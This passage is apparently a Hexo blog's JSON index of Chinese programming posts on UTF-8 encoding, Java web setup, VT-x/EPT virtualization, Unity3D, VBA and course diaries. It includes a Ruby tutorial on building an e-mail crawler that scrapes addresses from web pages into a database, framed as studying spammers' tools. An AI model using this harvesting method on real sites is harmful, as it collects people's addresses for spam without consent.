受到过网络编程加持的计算机僧侣们都知道，在网络里传递信息时有一个很重要的问题，就是对于数据高低位的解读方式，一些计算机是采用低位先发送的方法，例如我们PC机采用的 INTEL 架构，而另一些是采用高位先发送的方式，在网络中交换数据时，为了核对双方对于高低位的认识是否是一致的，采用了一种很简便的方法，就是在文本流的开始时向对方发送一个标志符——如果之后的文本是高位在位，那就发送&quot;FEFF&quot;，反之，则发送&quot;FFFE&quot;。不信你可以用二进制方式打开一个UTF-X格式的文件，看看开头两个字节是不是这两个字节？ 讲到这里，我们再顺便说说一个很著名的奇怪现象：当你在 windows 的记事本里新建一个文件，输入&quot;联通&quot;两个字之后，保存，关闭，然后再次打开，你会发现这两个字已经消失了，代之的是几个乱码！呵呵，有人说这就是联通之所以拼不过移动的原因。 其实这是因为GB2312编码与UTF8编码产生了编码冲撞的原因。 从网上引来一段从UNICODE到UTF8的转换规则： Unicode UTF-8 0000 - 007F 0xxxxxxx 0080 - 07FF 110xxxxx 10xxxxxx 0800 - FFFF 1110xxxx 10xxxxxx 10xxxxxx 例如&quot;汉&quot;字的Unicode编码是6C49。6C49在0800-FFFF之间，所以要用3字节模板：1110xxxx 10xxxxxx 10xxxxxx。将6C49写成二进制是：0110 1100 0100 1001，将这个比特流按三字节模板的分段方法分为0110 110001 001001，依次代替模板中的x，得到：1110-0110 10-110001 10-001001，即E6 B1 89，这就是其UTF8的编码。 而当你新建一个文本文件时，记事本的编码默认是ANSI, 如果你在ANSI的编码输入汉字，那么他实际就是GB系列的编码方式，在这种编码下，&quot;联通&quot;的内码是： c1 1100 0001 aa 1010 1010 cd 1100 1101 a8 1010 1000 注意到了吗？第一二个字节、第三四个字节的起始部分的都是&quot;110&quot;和&quot;10&quot;，正好与UTF8规则里的两字节模板是一致的，于是再次打开记事本时，记事本就误认为这是一个UTF8编码的文件，让我们把第一个字节的110和第二个字节的10去掉，我们就得到了&quot;00001 101010&quot;，再把各位对齐，补上前导的0，就得到了&quot;0000 0000 0110 1010&quot;，不好意思，这是UNICODE的006A，也就是小写的字母&quot;j&quot;，而之后的两字节用UTF8解码之后是0368，这个字符什么也不是。这就是只有&quot;联通&quot; 两个字的文件没有办法在记事本里正常显示的原因。 而如果你在&quot;联通&quot;之后多输入几个字，其他的字的编码不见得又恰好是110和10开始的字节，这样再次打开时，记事本就不会坚持这是一个utf8编码的文件，而会用ANSI的方式解读之，这时乱码又不出现了。 好了，终于可以回答NICO的问题了，在数据库里，有n前缀的字串类型就是UNICODE类型，这种类型中，固定用两个字节来表示一个字符，无论这个字符是汉字还是英文字母，或是别的什么。 如果你要测试&quot;abc汉字&quot;这个串的长度，在没有n前缀的数据类型里，这个字串是7个字符的长度，因为一个汉字相当于两个字符。而在有n前缀的数据类型里，同样的测试串长度的函数将会告诉你是5个字符，因为一个汉字就是一个字符。 本文链接： http://www.meng.uno/articles/97858b96/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"UTF-8","slug":"UTF-8","permalink":"http://www.meng.uno/tags/UTF-8/"},{"name":"Unicode","slug":"Unicode","permalink":"http://www.meng.uno/tags/Unicode/"}]},{"title":"E-mail小爬虫","slug":"ruby_email_crawler","date":"2016-10-10T06:18:08.000Z","updated":"2018-02-11T14:12:34.629Z","comments":true,"path":"articles/5d4e2c71/","link":"","permalink":"http://www.meng.uno/articles/5d4e2c71/","excerpt":"Ruby据说是一个比Python还要简洁还要快速的编程语言 ：） 好吧，这里并不是要挑起编程语言之间的战争，每个语言都有自己适应的场景，作为程序员应该知道在什么样的应用场景之下，用哪种的语言来实现业务逻辑，才是最重要的。 这次，我们使用Ruby来获取网页上的e-mail地址。 不知道各位有没有在成堆的垃圾邮件中，寻找某宝密码重置的邮件，简直是杯具…… 我们总是小心翼翼的保护着我们的邮箱，但还是被别有用心的人知道；e-mail爬虫就是这些人的工具之一，它可以在某个网页上过滤出一个个的e-mail，然后发送垃圾邮件。 “加密”你的email地址，防止爬虫收集 当然，我们抱着学习的心态，","text":"Ruby据说是一个比Python还要简洁还要快速的编程语言 ：） 好吧，这里并不是要挑起编程语言之间的战争，每个语言都有自己适应的场景，作为程序员应该知道在什么样的应用场景之下，用哪种的语言来实现业务逻辑，才是最重要的。 这次，我们使用Ruby来获取网页上的e-mail地址。 不知道各位有没有在成堆的垃圾邮件中，寻找某宝密码重置的邮件，简直是杯具…… 我们总是小心翼翼的保护着我们的邮箱，但还是被别有用心的人知道；e-mail爬虫就是这些人的工具之一，它可以在某个网页上过滤出一个个的e-mail，然后发送垃圾邮件。 “加密”你的email地址，防止爬虫收集 当然，我们抱着学习的心态，来了解它的基本结构，揭开它神秘的面纱。 代码下载： git clone http://git.shiyanlou.com/shiyanlou/email_spider 准备工作 实验楼已经提供了Ruby运行环境，但是，还是需要我们安装一些插件： 将gem下载源换为国内源 请确保只有ruby.taobao.org 12345 $ gem sources --remove http://rubygems.org/$ gem sources -a http://mirrors.aliyuncs.com/rubygems/$ gem sources -l**CURRENT SOURCES **http://mirrors.aliyuncs.com/rubygems/ 安装Ruby爬虫库 anemone 1234 $ sudo apt-get update$ sudo apt-get install ruby1.9.1-dev$ sudo apt-get install libsqlite3-dev$ sudo gem install anemone 查看对应的数据库支持 Ruby数据库支持 12 sudo gem install data_mappersudo gem install dm-sqlite-adapter 数据库设计 我们使用sqlite3来放置我们扒下来的数据： Site：存储爬行过的网站 Page：存储爬行过的存在email地址的页面的URL Address：email地址 我们只讲解其中一个表的model，其他更深入的请看： data_mapper property详解 Page模型需要include模块DataMapper::Resource，引入相应的方法，其中就包括了property，belongs_to，has n，validates_presence_of，这些我们马上需要用到的方法。 property：定义了对象的属性（表的字段类型），Serial是自增ID，并且是主键。 belongs_to： 定义了一对多的关系，一个网站可能包含了多个网页URL has n：定义多对多的关系，一个网页上可能包含多个email地址，一个email可能同时存在多个网页上。 validates_presence_of：检查 url是否存在。 data_mapper validates详解 爬虫代码 首先，我们需要引入uri 和 anemone包，其次还需要刚才定义的数据库的model 1234567 require 'uri'require 'anemone'require_relative 'data'data是对data.rb文件的引用。ARGV：获取命令行参数ruby crawl.rb http://www.test.test ARGV是Ruby的数组，所以我们用循环来处理它，因为我可以输入不只一个URL，如果，我们使用多线程的话，这样就可以同一时间处理多个URL，事半功倍。 然后马上使用URI()来处理传入的URL，结果返回给uri，下一步就把这个结果存入数据库中，uri.host网站的域名，和当前时间(这里使用的是内置模块Time) URI模块。 接下来的事情就很写意了，我们不需要自己去做很多的比如什么广度和深度算法的设计，我们只需要给它一个入口的URL，它会自动的去爬行，根本停不下来啊！ 使用模块Anemone的方法crawl创建一个新的爬虫，参数就传一个我们想爬行的URL就OK了！ Storage.PStore用来缓存新扒下来的网页代码，on_every_page处理每个页面，正则去匹配email，该页面的所有email会被包装在一个数组里面，然后循环这个数组并将结果存放数据库。 Anemone爬虫模块 if判断将会去查询address表，如果这个数据存在就更新，不存在则创建。 Datamapper更删查改详解 最后，将得到的E-mail地址输出到屏幕，又接着下一次循环，你要是不想等了，直接Ctrl+c吧 ：） 本文链接： http://www.meng.uno/articles/5d4e2c71/ 欢迎转载！","categories":[{"name":"Ruby","slug":"Ruby","permalink":"http://www.meng.uno/categories/Ruby/"},{"name":"爬虫","slug":"Ruby/爬虫","permalink":"http://www.meng.uno/categories/Ruby/爬虫/"},{"name":"E-mail","slug":"Ruby/爬虫/E-mail","permalink":"http://www.meng.uno/categories/Ruby/爬虫/E-mail/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://www.meng.uno/tags/爬虫/"},{"name":"E-mail","slug":"E-mail","permalink":"http://www.meng.uno/tags/E-mail/"},{"name":"Ruby","slug":"Ruby","permalink":"http://www.meng.uno/tags/Ruby/"}]},{"title":"我的Java+Struts2+MySQL配置","slug":"profile_javaweb","date":"2016-10-07T11:18:54.000Z","updated":"2018-03-02T03:24:31.141Z","comments":true,"path":"articles/61cdd944/","link":"","permalink":"http://www.meng.uno/articles/61cdd944/","excerpt":"在Eclipse中配置Struts2 为了配置Struts2，首先我明确了，配置其所需要的各个部分的文件，我的理解是，一个web.xml(配置监听器)、一个struts.xml(配置“action”)、导入必要的jar包，现将配置好的文件结构截图展示如下： 其中，web.xml与struts.xml具体内容将在以后篇幅具体展开！ 在Eclipse中配置MySQL 通过对该实验的理解，我发现eclipse配置数据库，并不是针对某一个项目，而是针对整个集成开发环境，所以，相应地配置MySQL也是整个IDE的事，在软件的总配置中，如下图所示位置： 此为我成功地加入了MySQL之后的界面","text":"在Eclipse中配置Struts2 为了配置Struts2，首先我明确了，配置其所需要的各个部分的文件，我的理解是，一个web.xml(配置监听器)、一个struts.xml(配置“action”)、导入必要的jar包，现将配置好的文件结构截图展示如下： 其中，web.xml与struts.xml具体内容将在以后篇幅具体展开！ 在Eclipse中配置MySQL 通过对该实验的理解，我发现eclipse配置数据库，并不是针对某一个项目，而是针对整个集成开发环境，所以，相应地配置MySQL也是整个IDE的事，在软件的总配置中，如下图所示位置： 此为我成功地加入了MySQL之后的界面，如果没有加入，需要点击右侧的“Add…”进行添加，如下图： 由于我添加的是最新的MySQL 5.1，所以在具体的项目中，我也需要导入相应版本的jar包，用来加载MySQL驱动： 添加的具体方法是将本地的此jar文件拖动到“WebContent-&gt;WEB-INF-&gt;lib”文件夹下，然后右键，将其添加到“Build Path”。 在Eclipse中配置Tomcat Tomcat是一个开源的web应用服务器，与MySQL一样，它也是对整个集成开发环境而言的，所以关于其的配置，也在eclipse的设置中，已经配置好的环境如下： 如果是第一次配置，仍然需要点击右侧的“Add…”来选择你要安装的版本： 再下一步就是要选择安装的tomcat的地址与安装名称了： 点击结束，就会自动安装好，每次对着web项目点击右键，在“Run As”选项下，第一个，就是：Run On Server，即在tomcat上运行该程序。 至此，开发环境已经完全搭建好了，接下来就是实际的开发过程了! 本文链接： http://www.meng.uno/articles/61cdd944/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"软工实验二回顾","slug":"lab2_se","date":"2016-10-06T12:42:57.000Z","updated":"2018-02-09T10:46:20.927Z","comments":true,"path":"articles/5353b854/","link":"","permalink":"http://www.meng.uno/articles/5353b854/","excerpt":"到现在为止，实验二基本上接近尾声了，今天发现了好几个特别坑的地方，现在乘着兴致，我将其总结如下： SAE的坑 首先，我想发表一下关于我们《软件工程》课所要用的SaaS平台——SAE的唾弃： * 特别贵 * 特别不人性 * 错误特别多 * …… 怎么应对SAE的坑 关于数据库的选择 我之前用的是“共享型”的，后来一直不成功，怎么都连不上（还不报错）！于是，我换成“独享型”还是没什么改变！！！在再三排查之后，发现原来是一个比较简单的又比较不注意的地方，而且网上还没有相关教程！！！ 原来， 我们本地的MySQL是不区分大小写的，而SAE上的MySQL大小写敏感！！ 连上数据库之后 在","text":"到现在为止，实验二基本上接近尾声了，今天发现了好几个特别坑的地方，现在乘着兴致，我将其总结如下： SAE的坑 首先，我想发表一下关于我们《软件工程》课所要用的SaaS平台——SAE的唾弃： 特别贵 特别不人性 错误特别多 …… 怎么应对SAE的坑 关于数据库的选择 我之前用的是“共享型”的，后来一直不成功，怎么都连不上（还不报错）！于是，我换成“独享型”还是没什么改变！！！在再三排查之后，发现原来是一个比较简单的又比较不注意的地方，而且网上还没有相关教程！！！ 原来， 我们本地的MySQL是不区分大小写的，而SAE上的MySQL大小写敏感！！ 连上数据库之后 在刚才的惊喜之后，又有了另一个问题，就是：原来SAE上传之后需要相对路径，不能使用我原来使用的绝对路径！ 关于中文 基本上在编写每一个页面时都会遇到关于中文的问题。 数据库插入中文 如果没有声明，默认情况下好像MySQL不是utf-8的编码，所以我将MySQL数据库地址后加入?useUnicode=true&amp;characterEncoding=utf8，就解决了这个问题。 网页传输遇到中文 我将一个页面的中文传递到另一个页面，发现在另一个页面接收时，其为空或者乱码，很乱的那种！后来，经过查询，我将“s”添加上，例如&lt;s:from&gt;…… 暂时只想到这么多啦！！ 本文链接： http://www.meng.uno/articles/5353b854/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"软工实验一要点回顾","slug":"lab1_se","date":"2016-09-28T10:57:29.000Z","updated":"2018-02-09T10:46:20.926Z","comments":true,"path":"articles/9ba24af6/","link":"","permalink":"http://www.meng.uno/articles/9ba24af6/","excerpt":"距离实验一结束已经有一段时间了，之所以选择在现在这个时候写这篇回顾，是想考验一下，是否真的像老师说的那样： “变量名没有特殊意义的话，过段时间就看不懂了！” 虽然没有到那种程度，但是确实：养成一个好的起变量名的习惯，是非常非常重要的！ 这一次再看以前的代码，觉得有几点比较好的地方： 方法较清晰 我们组在一开始规划的时候，就将这次实验“藐视”了，以至于我们只能使用一开始想好的强大的数据结构：数组！！！ 我们几乎把每种数组都用了一遍，也算是锻炼我们Java结构化编程基础了吧！我们 * 用String数组存放以“+/-”分割下来的多项式的每一项； * 用Int数组存放每一项的符号； * 用","text":"距离实验一结束已经有一段时间了，之所以选择在现在这个时候写这篇回顾，是想考验一下，是否真的像老师说的那样： “变量名没有特殊意义的话，过段时间就看不懂了！” 虽然没有到那种程度，但是确实：养成一个好的起变量名的习惯，是非常非常重要的！ 这一次再看以前的代码，觉得有几点比较好的地方： 方法较清晰 我们组在一开始规划的时候，就将这次实验“藐视”了，以至于我们只能使用一开始想好的强大的数据结构：数组！！！ 我们几乎把每种数组都用了一遍，也算是锻炼我们Java结构化编程基础了吧！我们 用String数组存放以“+/-”分割下来的多项式的每一项； 用Int数组存放每一项的符号； 用Char数组存放原始的输入串的每一个字符——以删掉多余的空格…… 总之，Java基本的元素，我们淋漓尽致地用上了！！ 安排较合理 我们没有将这次实验当做什么大的项目来做，反而是想“投机取巧”。 怎么个巧呢？待我一点点招来： 首先，我们在基本功能保障的情况下，写好了化简以及简化、求导等主要功能； 然后，当我想要添加功能时，我觉得我可以不用改动已经写好的功能，而仅仅将输入做处理，做成我们需要的样子！！ 是不是很机智！ 于是，在我们后来的拓展中，我们仅仅以一个for循环就实现一个功能的神速，比较简单地完成了这次实验。 后记 这是我使用Java写的第一个项目，有很多东西没法用的那么熟练，例如：每次分割字符串，我们都是用“substring+for循环”来实现。 后来，我终于发现我为什么没法用 split了，原来在使用它的时候，参数如果是符号，就要加“\\”，对，是两个“\\”，这样才行。 也算是通过实验掌握的一个Java小知识吧！！ 本文链接： http://www.meng.uno/articles/9ba24af6/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"一次数学建模经历","slug":"cumum2016","date":"2016-09-12T04:25:49.000Z","updated":"2018-02-09T10:46:20.920Z","comments":true,"path":"articles/832e4a48/","link":"","permalink":"http://www.meng.uno/articles/832e4a48/","excerpt":"经过三个白天，一个黑夜的战斗，我们终于如期赶出我们的数学建模论文。我将链接附加于此，希望大家帮忙指正。版权所有，请勿抄袭。 https://mega.nz/#!PMliSAbb!6hoWFHJEI3W3M0Exn6edmbhhl2CGdZa7XRom-KjktVI 结果：省一 三天日记 第一天 看看现在的时间，竞赛第一天就这么过去了。然而到现在为止，我们什么都没做！！ 为什么会这样？ 我觉得，最主要的原因，应该是我们组自己的问题——从来没有实际模拟过！就在开赛的前几天，我们还在为平时的课而发愁。 还有就是，我们的选题，虽然我学过一年的交通，但是在这道题上，我还是显得手足无措，丝毫没有","text":"经过三个白天，一个黑夜的战斗，我们终于如期赶出我们的数学建模论文。我将链接附加于此，希望大家帮忙指正。版权所有，请勿抄袭。 https://mega.nz/#!PMliSAbb!6hoWFHJEI3W3M0Exn6edmbhhl2CGdZa7XRom-KjktVI 结果：省一 三天日记 第一天 看看现在的时间，竞赛第一天就这么过去了。然而到现在为止，我们什么都没做！！ 为什么会这样？ 我觉得，最主要的原因，应该是我们组自己的问题——从来没有实际模拟过！就在开赛的前几天，我们还在为平时的课而发愁。 还有就是，我们的选题，虽然我学过一年的交通，但是在这道题上，我还是显得手足无措，丝毫没有思路，当初我们之所以选这道题是因为我们觉得第一题可能不太适合我们非数学系的人做，这么看来，第二题不适合 我们非工程学生做啊233。 我的想法 虽然有这么多的困难，但是我觉得我还是很有信心的，毕竟这次竞赛意义非比寻常！ 虽然有那么多的不适合，但是还是有很努力的小伙伴们一起！ 立个Flag 我们一定做好这次建模！ 第二天 我们或许还是太年轻，太没有经验，昨天大好时光居然就那么浪费了，谁知道今天依旧没有什么头绪。还 有10分钟就明天了，可是到现在我们连一个模型都没建好，连第一题都没有写出来。虽说第一次，失败了也没有关系，但是如果还有时间可以努力，但是已经宣布你失败了，谁会甘心！ 我们从早上8点到正心去合作讨论，一直到刚才不久，才回到寝楼的自习室，继续我们的”创举“，只能用充实来形容这一天天的生活。 不过，大学生嘛，总得在大学期间有所追求，有所疯狂，眼看着已经大三，这应该是我们这组人唯一一次参加的数学建模了。时间不多也不少，还有一半！ 看着对面的两个队友都在认真地查阅着文献，而我却在这写博客，着实有点不好意思，不过还好，马上就结束了，希望我能在接下来的一半时间里，认真投入，也预祝我们对在这次比赛中取得好成绩！ 第三天 本来昨天才应该是第三天，可是我觉得加上这11个小时，第三天才算完整！ 说实话，前两天我们真的没做出什么像样的东西来，连第二题都没有写完，连模型都没有建起来，但是最后一天往往就是转机！ 第三天如往常一样来临，这一次我们起的一个比一个晚，总是听到周围同学不想做了的豪情壮语，我们也有点想要放弃了呢。 但我们没一个人敢先提“放弃”，就这样我们仅仅抱着想把这次竞赛打完的想法，一点点凑着我们丝毫没有连贯性的论文。 夜，很快就来了，我们都感到疲倦。 最终只有我和赵正宇坚持熬夜来做，我们避开楼管大叔，来到正心楼8楼，准确地说是822教室，教室里随处可见考研教材和英语资料。 我们选了最后一排，继续我们的创作，本来丝毫没有连贯性的一篇一万多字的“杂文”，居然在我们不到三个小时的时间里将它完全驯服妥帖。 我们本来都在暗自高兴，也就聊到了其他的一些事情，可能没有这次竞赛，不会和这位老乡这么亲切，也不会体验到真正的努力是什么滋味！ 乘着兴致，我很快又做完了平时需要几个小时才能完成的评优评奖答辩PPT。 这是天已经亮了，哈尔滨远没有家乡那么热闹，一切都还在睡梦中。 我们迫不及待地一遍遍保存、转换格式、阅读……确保没有什么错误了，我们又急切地准备提交了。这一切简直不敢相信，只能说太佩服自己了！ 今天早晨，吃了这学期第一次早餐，最饱的一次早餐…… 本文链接： http://www.meng.uno/articles/832e4a48/ 欢迎转载！","categories":[{"name":"数学建模","slug":"数学建模","permalink":"http://www.meng.uno/categories/数学建模/"}],"tags":[{"name":"数学建模","slug":"数学建模","permalink":"http://www.meng.uno/tags/数学建模/"}]},{"title":"VT-x/EPT解读","slug":"VT-x","date":"2016-09-10T04:07:20.000Z","updated":"2018-04-10T05:46:42.626Z","comments":true,"path":"articles/18c2ca64/","link":"","permalink":"http://www.meng.uno/articles/18c2ca64/","excerpt":"1 VT-x VT-x是intel针对硬件辅助虚拟化的技术，它解决x86指令集不能被虚拟化的问题，并且简化了VMM软件，减少了软件虚拟化的需求。Virtual Machine Extensions定义了一系列新的操作，称为VMX操作，来提供处理器级别的支持。同时它提供了一个新的特权等级VMX root给VMM，从而避免了ring deprivileging方法(让操作系统运行于ring 1，VMM使用ring 0)带来的虚拟化漏洞。VMX操作可以分为两类： * root:VMM执行的VMX root 操作 * non-root:Guest执行的VMX non-root操作 对于这两种模","text":"1 VT-x VT-x是intel针对硬件辅助虚拟化的技术，它解决x86指令集不能被虚拟化的问题，并且简化了VMM软件，减少了软件虚拟化的需求。Virtual Machine Extensions定义了一系列新的操作，称为VMX操作，来提供处理器级别的支持。同时它提供了一个新的特权等级VMX root给VMM，从而避免了ring deprivileging方法(让操作系统运行于ring 1，VMM使用ring 0)带来的虚拟化漏洞。VMX操作可以分为两类： root:VMM执行的VMX root 操作 non-root:Guest执行的VMX non-root操作 对于这两种模式之间的转换，VMX提供了确切的说法： VM Entry:转换到VMX non-root操作 VM Exit:从VMX non-root操作转换到VMX root操作 实际上，这个操作过程也就是VMM和虚拟机之间的转换过程。VMCS是一个用来管理VMX non-root操作和VMX转换的数据结构。它由VMM配置，指定guest OS状态，并在VM exits发生时进行控制。 2 MMU虚拟化 第一代VT-x在每次VMX转换都会进行TLB冲洗，这会造成在所有VM exits和大部分VM entries时的性能流失，因此对TLB清洗必须有更好的VMM软件控制。VPID(virtual Processor Identifier)是VMCS中的一个16bit域，它用来缓存线性翻译的结果。VPID启动时，就不需要冲洗TLB，不同虚拟机的TLB项能在TLB中共存。 既往的VMM维持一个shadow page table，将guest的virtual pages，直接映射到machine pages。同时，guest中的V-&gt;P表，与VMM中V-&gt;M shadow page table同步。为了维持guest page table和shadow page table之间的关系，会因为VMM traps造成额外的代价，每次切换都会丢失性能，并且为了复制guest page table，在内存上也会有额外花费。 3 EPT(Extended Page Table) EPT这样的硬件支持(在AMD架构中类似的技术是NPT，nested page table)能够有效解决传统shadow page table的花销问题。在KVM最新的内存虚拟化技术中，采用了两级页表映射。第一级页表，客户虚拟机采用的是传统操作系统的页表，也即guest page table，记录着客户机虚拟地址(GVA)到客户机物理地址(GPA)的映射。而在KVM中，维护的第二级页表是extended page table(EPT)，记录的是虚拟机物理地址(GPA)到宿主机物理地址(HPA)的映射。 在图中可以看到，包括guest CR3在内，一共有5个GPA，它们都要通过硬件走一次EPT，得到下一个HPA。那么如何通过EPT计算出对应的HPA呢，KVM是如何操作的呢？EPT和传统的页表一样，也分为4层(PML4、PDPT、PD、PT)，一个gpa通过四级页表的寻址，再加上gpa最后12位的offset，得到了hpa。 在这个架构中，页可以分为两种：物理页(physical page)和页表页(MMU page)。物理页就是真正存放数据的页，页表页是存放EPT页表的页。这两种页创建的方式也不同，物理页可以通过内核提供的__get_free_page来创建，而页表页则是通过mmu_page_cache获得。这个page cache是在KVM初始化vcpu时通过linux内核中的slab机制分配的，它作为之后的MMU pages的cache来使用。在KVM中，每个MMU page对应一个数据结构kvm_mmu_page，在EPT处理过程中，它是极为重要的一个数据结构。 一条地址如何翻译？首先non-root状态下的CPU加载guest CR3，由于guest CR3是一条GPA，CPU需要通过EPT来实现GPA-&gt;HPA的转换。但首先，MMU会先查询硬件的TLB，来判断有没有GPA到HPA的映射。如果没有GPA到HPA的映射，那么在cache中查询EPT/NPT。如果cache里面没有缓存，则逐层向下层存储查询，最终获得guest CR3所映射的物理地址单元内容，作为下一级guest页表的索引基址。当CPU访问EPT页表，查找HPA，发现相应的页表项不存在时，就会抛出EPT Violation，由VMM截获处理它。随后通过GVA的偏移量，计算出下一条GPA，依次循环下去，直到最终获得客户机请求的页。整个过程如下图所示。 本文链接： http://www.meng.uno/articles/18c2ca64/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Intel","slug":"Intel","permalink":"http://www.meng.uno/tags/Intel/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://www.meng.uno/tags/虚拟化/"},{"name":"VT-x","slug":"VT-x","permalink":"http://www.meng.uno/tags/VT-x/"},{"name":"EPT","slug":"EPT","permalink":"http://www.meng.uno/tags/EPT/"}]},{"title":"Unity3D的使用","slug":"Unity3D","date":"2016-08-29T08:19:21.000Z","updated":"2018-03-20T10:39:51.533Z","comments":true,"path":"articles/eb5ab78e/","link":"","permalink":"http://www.meng.uno/articles/eb5ab78e/","excerpt":"1. GameObject.CreatePrimitive():创建一个原始游戏对象，七参数可以设置为立方体、球体、圆柱体等系统默认的游戏对象。 2. AddComponent():用于给该游戏对象添加一个组件。组件没有自身对应的删除方法，需要使用父类执行Object.Destroy()才能删除 1 2 3 GameObject obj = GameObject.Find(\"Cube\"); obj.AddComponent(\"Test\"); //给对象添加Test脚本 Destroy(obj.GetComponent(\"Test\")); //删除对象的Test","text":"GameObject.CreatePrimitive():创建一个原始游戏对象，七参数可以设置为立方体、球体、圆柱体等系统默认的游戏对象。 AddComponent():用于给该游戏对象添加一个组件。组件没有自身对应的删除方法，需要使用父类执行Object.Destroy()才能删除 123 GameObject obj = GameObject.Find(\"Cube\"); obj.AddComponent(\"Test\"); //给对象添加Test脚本Destroy(obj.GetComponent(\"Test\")); //删除对象的Test脚本 renderer.material.color:设置渲染材质的颜色或贴图 trasform.position:设置该游戏对象的位置 获取游戏物体的三种方案 123456 - GameObject obj = GameObject.find(\"UI Root\\player\"); - 该方法的参数为游戏对象在Hierarchy视图中的完整路径- GameObject obj = GameObject.FindWithTag(\"MyTag\"); - 该方法参数为给游戏对象添加的Tag- GameObject[] objs = GameObject.FindGameObjectsWithTag(\"MyTag\"); - 该方法能够获取所有标签为`MyTag`的对象 消息的发送 1234 BroadcastMessage(\"arg1\",\"arg2\") //向子类发送消息 SednMessage(\"arg1\",\"arg2\") //向自己发送消息 SendMessageUpwards(\"arg1\",\"arg2\") //向父类发送消息 //arg1表示接收消息,arg2表示发送的参数 Instantiate()克隆游戏对象. 游戏对象位置相关 obj.transform.position() //对象的当前位置 obj.transform.Rotate() //旋转对象 obj.transform.RotateAround()//围绕某点旋转 Time.deltaTime //上一帧所消耗的时间 Vector3.right //x轴方向 Vector3.up //y轴方向 Vector3.forward //z轴方向 transform.Translate(Vector3.forward)//平移 transform.localeScale = Vectors(scaleX,scaleY,scaleZ)//缩放 游戏脚本都要继承MonoBehaviour类。而且新建的类名应该和项目资源视图中该脚本的名称对应，否则就无法成功绑定至游戏对象。 Time类 Time.time:从游戏开始后开始计时，表示机制目前共运行的游戏时间 Time.deltaTime:获取Update()方法中完成上一帧所消耗的时间 Time.fixedTime:FixedUpdate()方法中固定消耗的时间中和 Time.fixedDeltaTime:固定更新上一帧所消耗的时间。 WaitForSeconds(int argc)可以让程序等待argc秒。返回值为IEnumerator，在需要等待的地方调用yield return new WaitForSeconds(s)，让主线程等待s秒后继续执行。调用改函数的函数应该将返回类型设置为IEnumerator。 1234567891011121314 public class test : MonoBehaviour&#123; IEnumerator Start() &#123; return Test(); &#125; IEnumerator Test() &#123; yield return new WaitForSeconds(7); //等待2秒后返回 &#125;&#125; Random.Range(int start, int end)获取随机数，获取范围是个闭合的类似(start,end)。即在不包含start和end的值随机。 Renderer(渲染器)的使用: 123 Renderer render = obj.GetComponent(\"Renderer\");render.material.color = Color.green; //组件颜色render.material.mainTexture = null; //组件贴图 Mathf 数学工具函数 123456789 Mathf.Abs(int i);Mathf.Clamp(int num, int min, int max);Mathf.Lerp(float start, float end, Time.time);Mathf.Sin(5);Mathf.Cos(7);Mathf.Tan(3);Mathf.Max(33,77);Mathf.Min(33,99);Mathf.PI; 本文链接： http://www.meng.uno/articles/eb5ab78e/ 欢迎转载！","categories":[{"name":"游戏Client","slug":"游戏Client","permalink":"http://www.meng.uno/categories/游戏Client/"}],"tags":[{"name":"Unity3D","slug":"Unity3D","permalink":"http://www.meng.uno/tags/Unity3D/"}]},{"title":"VBA常用语法","slug":"VBA","date":"2016-08-29T08:14:52.000Z","updated":"2018-03-20T10:39:51.533Z","comments":true,"path":"articles/c779c554/","link":"","permalink":"http://www.meng.uno/articles/c779c554/","excerpt":"1. 数组下标是从0开始的 2. sheet下标是从1开始的 3. 获取dict的方法 1 2 Dim dic setdic = CreateObject(\"Scripting.Dictionary\") 4. dict添加数值方法 1 dic.Add key, value 5. 遍历dict 方法 1 2 3 For Each Data In dict MsgBox (dict.Item(Data) & \":\" & Data) Next 6. vba用 '&'来连接字符串 7. 正则表达式使用方法 1 2 3 4 5 Dim regEx","text":"数组下标是从0开始的 sheet下标是从1开始的 获取dict的方法 12 Dim dic setdic = CreateObject(\"Scripting.Dictionary\") dict添加数值方法 1 dic.Add key, value 遍历dict 方法 123 For Each Data In dict MsgBox (dict.Item(Data) &amp; \":\" &amp; Data)Next vba用 '&amp;'来连接字符串 正则表达式使用方法 12345 Dim regExSet regEx = CreateObject(\"vbscript.regexp\")regEx.Global = TrueregEx.Pattern = \".?[0-9A-F]+$\"result = regEx.test(content) '验证content 获取某张数据表(sheet)已经使用的行列数方法 123 Dim rows, columns rows = sheet.UsedRange.rows.Count colums = sheet.UsedRange.Columns.Count 获取某张数据表 123 Sheets(i)'根据id获取表 Sheets(\"map\")'根据名称获取表Sheets(i).name'获取表的名称 获得数据表的某行内容 12 Sheets(i).Cells(c, 1)Sheets(i).Range(\"A17\") UBound获取数组长度(数组最后一位的下标,数组从0开始).1表示有两个数 当函数从中间处理错误要退出可以使用 Exit Function不要用Return，不然返回值会没有 使用 Function关键字能有返回值，返回值应该赋给函数名。 本文链接： http://www.meng.uno/articles/c779c554/ 欢迎转载！","categories":[{"name":"脚本语言","slug":"脚本语言","permalink":"http://www.meng.uno/categories/脚本语言/"}],"tags":[{"name":"VBA","slug":"VBA","permalink":"http://www.meng.uno/tags/VBA/"}]},{"title":"减少HTTP请求","slug":"reduce-http-requests","date":"2016-08-14T05:10:00.000Z","updated":"2018-03-20T06:59:57.927Z","comments":true,"path":"articles/a7561c66/","link":"","permalink":"http://www.meng.uno/articles/a7561c66/","excerpt":"前言 关于web性能，有两个著名论断： 1. 0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力——Robert Miller 2. 用户所接受的数据，有80~90%的时间都耗在前端上——Steve Souders 